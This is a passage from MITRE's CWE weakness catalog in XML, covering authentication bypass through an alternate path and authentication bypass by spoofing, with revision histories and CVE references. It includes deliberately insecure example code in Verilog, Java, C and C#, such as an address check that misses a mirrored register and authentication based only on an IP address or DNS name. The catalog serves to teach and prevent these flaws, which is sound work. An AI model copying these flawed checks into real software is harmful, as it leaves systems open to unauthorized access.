               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Detection_Factors, Potential_Mitigations, References, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-02-18</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-05-03</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Likelihood_of_Exploit, Modes_of_Introduction, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated References, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, Related_Attack_Patterns, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-09-19</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-12-10</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Alternate_Terms, Demonstrative_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-06-28</Modification_Date>
					<Modification_Comment>updated Observed_Examples, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples, Observed_Examples, References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description, Maintenance_Notes, Observed_Examples, Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-10-26</Modification_Date>
					<Modification_Comment>updated Observed_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2024-02-29</Modification_Date>
					<Modification_Version>4.14</Modification_Version>
					<Modification_ReleaseDate>2024-02-29</Modification_ReleaseDate>
					<Modification_Comment>updated Observed_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2024-07-16</Modification_Date>
					<Modification_Version>4.15</Modification_Version>
					<Modification_ReleaseDate>2024-07-16</Modification_ReleaseDate>
					<Modification_Comment>updated Diagram</Modification_Comment>
				</Modification>
	    <Contribution Type="Content">
	      <Contribution_Name>Abhi Balakrishnan</Contribution_Name>
	      <Contribution_Date>2024-02-29</Contribution_Date>
	      <Contribution_Version>4.15</Contribution_Version>
	      <Contribution_ReleaseDate>2024-07-16</Contribution_ReleaseDate>
	      <Contribution_Comment>Provided diagram to improve CWE usability</Contribution_Comment>
	    </Contribution>
            <Previous_Entry_Name Date="2008-04-11">Authentication Issues</Previous_Entry_Name>
            <Previous_Entry_Name Date="2009-01-12">Insufficient Authentication</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="288" Name="Authentication Bypass Using an Alternate Path or Channel" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>A product requires authentication, but the product has an alternate path or channel that does not require authentication.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="306" View_ID="1000" Ordinal="Primary"/>
	    <Related_Weakness Nature="ChildOf" CWE_ID="284" View_ID="1340" Ordinal="Primary"/>
            <Related_Weakness Nature="PeerOf" CWE_ID="420" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.</Note>
            </Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>This is often seen in web applications that assume that access to a particular CGI program can only be obtained through a "front" screen, when the supporting programs are directly accessible. But this problem is not just in web apps.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Funnel all access through a single choke point to simplify how users can access a resource. For every access, perform a check to determine if the user has permissions to access the resource.</Description>
            </Mitigation>
         </Potential_Mitigations>
		 <Demonstrative_Examples>
		   <Demonstrative_Example Demonstrative_Example_ID="DX-176">
             <Intro_Text>
               <xhtml:p>
                 Register SECURE_ME is located at address 0xF00. A
                 mirror of this register called COPY_OF_SECURE_ME is
                 at location 0x800F00. The register SECURE_ME is
                 protected from malicious agents and only allows
                 access to select, while COPY_OF_SECURE_ME is not. 
               </xhtml:p>
               <xhtml:p>
                 Access control is implemented using an allowlist (as
                 indicated by acl_oh_allowlist). The identity of the
                 initiator of the transaction is indicated by the
                 one hot input, incoming_id. This is checked against
                 the acl_oh_allowlist (which contains a list of
                 initiators that are allowed to access the asset). 
               </xhtml:p>
               <xhtml:p>
                 Though this example is shown in Verilog, it will
                 apply to VHDL as well. 
               </xhtml:p>
             </Intro_Text>
             <Example_Code Nature="Informative" Language="Verilog">
               module foo_bar(data_out, data_in, incoming_id, address, clk, rst_n);<xhtml:br/>
               output [31:0] data_out;<xhtml:br/>
               input [31:0] data_in, incoming_id, address;<xhtml:br/>
               input clk, rst_n;<xhtml:br/>
               wire write_auth, addr_auth;<xhtml:br/>
               reg [31:0] data_out, acl_oh_allowlist, q;<xhtml:br/>
               assign write_auth = | (incoming_id &amp; acl_oh_allowlist) ? 1 : 0; <xhtml:br/>
               always @*<xhtml:br/>
               <xhtml:div style="margin-left:1em;">
                 acl_oh_allowlist &lt;= 32'h8312; <xhtml:br/>
               </xhtml:div>
               assign addr_auth = (address == 32'hF00) ? 1: 0;<xhtml:br/>
               always @ (posedge clk or negedge rst_n)<xhtml:br/>
               <xhtml:div style="margin-left:1em;">
                 if (!rst_n)<xhtml:br/>
                 <xhtml:div style="margin-left:1em;">
                   begin<xhtml:br/>
                   <xhtml:div style="margin-left:1em;">
                     q &lt;= 32'h0;<xhtml:br/>
                     data_out &lt;= 32'h0;<xhtml:br/>
                   </xhtml:div>
                   end<xhtml:br/>
                 </xhtml:div>
                 else<xhtml:br/>
                 <xhtml:div style="margin-left:1em;">
                   begin<xhtml:br/>
                   <xhtml:div style="margin-left:1em;">
                     q &lt;= (addr_auth &amp; write_auth) ? data_in: q;<xhtml:br/>
                     data_out &lt;= q;<xhtml:br/>
                   </xhtml:div>
                   end<xhtml:br/>
                 </xhtml:div>
                 end<xhtml:br/>
               </xhtml:div>
               endmodule<xhtml:br/>
             </Example_Code>
			 <Example_Code Nature="Bad" Language="Verilog">assign addr_auth = (address == 32'hF00) ? 1: 0;</Example_Code>
             <Body_Text>The bugged line of code is repeated in the Bad
             example above. Weakness arises from the fact that the
             SECURE_ME register can be modified by writing to the
             shadow register COPY_OF_SECURE_ME, the address of
             COPY_OF_SECURE_ME should also be included in the check.
             That buggy line of code should instead be replaced as
             shown in the Good Code Snippet below. 
             </Body_Text>
			 <Example_Code Nature="Good" Language="Verilog">assign addr_auth = (address == 32'hF00 || address == 32'h800F00) ? 1: 0;</Example_Code>
		   </Demonstrative_Example>
		 </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2000-1179</Reference>
               <Description>Router allows remote attackers to read system logs without authentication by directly connecting to the login screen and typing certain control characters.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2000-1179</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-1999-1454</Reference>
               <Description>Attackers with physical access to the machine may bypass the password prompt by pressing the ESC (Escape) key.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-1999-1454</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-1999-1077</Reference>
               <Description>OS allows local attackers to bypass the password protection of idled sessions via the programmer's switch or CMD-PWR keyboard sequence, which brings up a debugger that the attacker can use to disable the lock.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-1999-1077</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2003-0304</Reference>
               <Description>Direct request of installation file allows attacker to create administrator accounts.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2003-0304</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-0870</Reference>
               <Description>Attackers may gain additional privileges by directly requesting the web management URL.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-0870</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-0066</Reference>
               <Description>Bypass authentication via direct request to named pipe.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-0066</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2003-1035</Reference>
               <Description>User can avoid lockouts by using an API instead of the GUI to conduct brute force password guessing.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2003-1035</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Authentication Bypass by Alternate Path/Channel</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2007">
               <Entry_ID>A10</Entry_ID>
               <Entry_Name>Failure to Restrict URL Access</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="127"/>
            <Related_Attack_Pattern CAPEC_ID="665"/>
         </Related_Attack_Patterns>
         <Mapping_Notes>
            <Usage>Allowed</Usage>
            <Rationale>This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.</Rationale>
            <Comments>Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.</Comments>
            <Reasons>
               <Reason Type="Acceptable-Use"/>
            </Reasons>
         </Mapping_Notes>
         <Notes>
            <Note Type="Relationship">overlaps Unprotected Alternate Channel</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
               <Submission_Version>Draft 3</Submission_Version>
               <Submission_ReleaseDate>2006-07-19</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Description, Modes_of_Introduction, Name, Relationships, Observed_Example, Relationship_Notes, Taxonomy_Mappings, Type</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-11-24</Modification_Date>
               <Modification_Comment>updated Observed_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Observed_Examples, Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-05-03</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Modes_of_Introduction, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-12-10</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-10-26</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2008-09-09">Authentication Bypass by Alternate Path/Channel</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="290" Name="Authentication Bypass by Spoofing" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>This attack-focused weakness is caused by incorrectly implemented authentication schemes that are subject to spoofing attacks.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="1390" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="287" View_ID="1003" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Note>This weakness can allow an attacker to access resources which are not otherwise accessible without proper authentication.</Note>
            </Consequence>
         </Common_Consequences>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The following code authenticates users.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>String sourceIP = request.getRemoteAddr();<xhtml:br/>if (sourceIP != null &amp;&amp; sourceIP.equals(APPROVED_IP)) {<xhtml:div style="margin-left:1em;">authenticated = true;</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>The authentication mechanism implemented relies on an IP address for source validation. If an attacker is able to spoof the IP, they may be able to bypass the authentication mechanism.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-99">
               <Intro_Text>Both of these examples check if a request is from a trusted address before responding to the request.</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>sd = socket(AF_INET, SOCK_DGRAM, 0);<xhtml:br/>serv.sin_family = AF_INET;<xhtml:br/>serv.sin_addr.s_addr = htonl(INADDR_ANY);<xhtml:br/>servr.sin_port = htons(1008);<xhtml:br/>bind(sd, (struct sockaddr *) &amp; serv, sizeof(serv));<xhtml:br/>
                     <xhtml:br/>while (1) {<xhtml:div style="margin-left:1em;">memset(msg, 0x0, MAX_MSG);<xhtml:br/>clilen = sizeof(cli);<xhtml:br/>if (inet_ntoa(cli.sin_addr)==getTrustedAddress()) {<xhtml:div style="margin-left:1em;">n = recvfrom(sd, msg, MAX_MSG, 0, (struct sockaddr *) &amp; cli, &amp;clilen);</xhtml:div>}</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>while(true) {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>DatagramPacket rp=new DatagramPacket(rData,rData.length);<xhtml:br/>outSock.receive(rp);<xhtml:br/>String in = new String(p.getData(),0, rp.getLength());<xhtml:br/>InetAddress clientIPAddress = rp.getAddress();<xhtml:br/>int port = rp.getPort();<xhtml:br/>
                           <xhtml:br/>if (isTrustedAddress(clientIPAddress) &amp; secretKey.equals(in)) {<xhtml:div style="margin-left:1em;">out = secret.getBytes();<xhtml:br/>DatagramPacket sp =new DatagramPacket(out,out.length, IPAddress, port); outSock.send(sp);</xhtml:div>}</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>The code only verifies the address as stored in the request packet. An attacker can spoof this address, thus impersonating a trusted client.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-93">
               <Intro_Text>The following code samples use a DNS lookup in order to decide whether or not an inbound request is from a trusted host. If an attacker can poison the DNS cache, they can gain trusted status.</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>struct hostent *hp;struct in_addr myaddr;<xhtml:br/>char* tHost = "trustme.example.com";<xhtml:br/>myaddr.s_addr=inet_addr(ip_addr_string);<xhtml:br/>
                     <xhtml:br/>hp = gethostbyaddr((char *) &amp;myaddr, sizeof(struct in_addr), AF_INET);<xhtml:br/>if (hp &amp;&amp; !strncmp(hp-&gt;h_name, tHost, sizeof(tHost))) {<xhtml:div style="margin-left:1em;">trusted = true;</xhtml:div>} else {<xhtml:div style="margin-left:1em;">trusted = false;</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>String ip = request.getRemoteAddr();<xhtml:br/>InetAddress addr = InetAddress.getByName(ip);<xhtml:br/>if (addr.getCanonicalHostName().endsWith("trustme.com")) {<xhtml:div style="margin-left:1em;">trusted = true;</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Example_Code Nature="Bad" Language="C#">
                  <xhtml:div>IPAddress hostIPAddress = IPAddress.Parse(RemoteIpAddress);<xhtml:br/>IPHostEntry hostInfo = Dns.GetHostByAddress(hostIPAddress);<xhtml:br/>if (hostInfo.HostName.EndsWith("trustme.com")) {<xhtml:div style="margin-left:1em;">trusted = true;</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>IP addresses are more reliable than DNS names, but they can also be spoofed. Attackers can easily forge the source IP address of the packets they send, but response packets will return to the forged IP address. To see the response packets, the attacker has to sniff the traffic between the victim machine and the forged IP address. In order to accomplish the required sniffing, attackers typically attempt to locate themselves on the same subnet as the victim machine. Attackers may be able to circumvent this requirement by using source routing, but source routing is disabled across much of the Internet today. In summary, IP address verification can be a useful part of an authentication scheme, but it should not be the single factor required for authentication.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
	    <Observed_Example>
              <Reference>CVE-2022-30319</Reference>
               <Description>S-bus functionality in a home automation product performs access control using an IP allowlist, which can be bypassed by a forged IP address.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-30319</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-1048</Reference>
               <Description>VOIP product allows authentication bypass using 127.0.0.1 in the Host header.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-1048</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Authentication bypass by spoofing</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="21"/>
            <Related_Attack_Pattern CAPEC_ID="22"/>
            <Related_Attack_Pattern CAPEC_ID="459"/>
            <Related_Attack_Pattern CAPEC_ID="461"/>
            <Related_Attack_Pattern CAPEC_ID="473"/>
            <Related_Attack_Pattern CAPEC_ID="476"/>
            <Related_Attack_Pattern CAPEC_ID="59"/>
            <Related_Attack_Pattern CAPEC_ID="60"/>
            <Related_Attack_Pattern CAPEC_ID="667"/>
            <Related_Attack_Pattern CAPEC_ID="94"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-62" Section="Chapter 3, &#34;Spoofing and Identification&#34;, Page 72"/>
         </References>
         <Mapping_Notes>
            <Usage>Allowed</Usage>
            <Rationale>This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.</Rationale>
            <Comments>Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.</Comments>
            <Reasons>
               <Reason Type="Acceptable-Use"/>
            </Reasons>
         </Mapping_Notes>
         <Notes>
            <Note Type="Relationship">This can be resultant from insufficient verification.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
               <Submission_Version>Draft 3</Submission_Version>
               <Submission_ReleaseDate>2006-07-19</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Name>Sean Eidemiller</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>added/updated demonstrative examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Description, Relationships, Relationship_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Relationship_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Demonstrative_Examples, Observed_Examples, References, Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-02-18</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
